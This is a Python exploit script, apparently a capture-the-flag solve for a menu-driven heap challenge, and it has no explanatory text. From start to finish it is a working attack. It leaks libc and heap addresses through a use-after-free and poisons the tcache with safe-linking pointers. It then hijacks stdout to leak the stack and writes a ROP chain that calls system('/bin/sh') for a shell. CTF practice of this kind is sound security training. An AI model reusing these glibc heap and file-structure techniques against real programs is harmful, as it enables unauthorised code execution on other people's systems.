#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x137E
brva 0x14EC
brva 0x15D2
brva 0x1698
brva 0x135F
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, aslr=False)

def choice(option: int):
    slna(b'choice: ', option)

def create(idx, data):
    choice(1)
    slna(b': ', idx)
    sa(b'creation: ', data)

def update(idx, data):
    choice(2)
    slna(b': ', idx)
    sa(b'update: ', data)

def read(idx):
    choice(3)
    slna(b': ', idx)

def delete(idx):
    choice(4)
    slna(b': ', idx)

def encrypt(base, target):
    return p64( (base >> 12 ) ^ target)

# ==================== EXPLOIT ====================
p = start()

sla(b'choice: ', b'.')
setvbuf = int(ru(b' is invalid choice, please try again', drop=True))
libc.address = setvbuf - 0x816e5
success("libc base: %#x", libc.address)

create(0, b'0')
delete(0)

read(0)
ru(b'data: ')
heap = fixleak(rl()[:-1]) << 12
success('heap base @ %#x', heap)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

for _ in range(2):
    update(0, p64(heap >> 12) + p64(0))
    delete(0)


update(0, encrypt(heap, libc.sym._IO_2_1_stdout_) + p64(0))
create(1, b'1')

fake_stdout = flat(
    0xfbad1800,
    0, 0, 0,
    libc.sym.environ,
    libc.sym.environ + 0x8,
    libc.sym.environ + 0x8,
    libc.sym.environ + 0x8,
    libc.sym.environ + 0x9
)

create(2, fake_stdout)
stack = fixleak(ru(b'\n=== menu ===', drop=True))
saved_rbp = stack - 0x188
success('stack leak @ %#x', stack)
success('saved rbp @ %#x', saved_rbp)

delete(1)
update(1, encrypt(heap, saved_rbp) + p64(0))

create(3, b'3')

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = pop_rdi + 1

create(4, flat(
    0,
    pop_rdi, next(libc.search(b'/bin/sh\0')),
    ret, libc.sym.system
))

interactive()
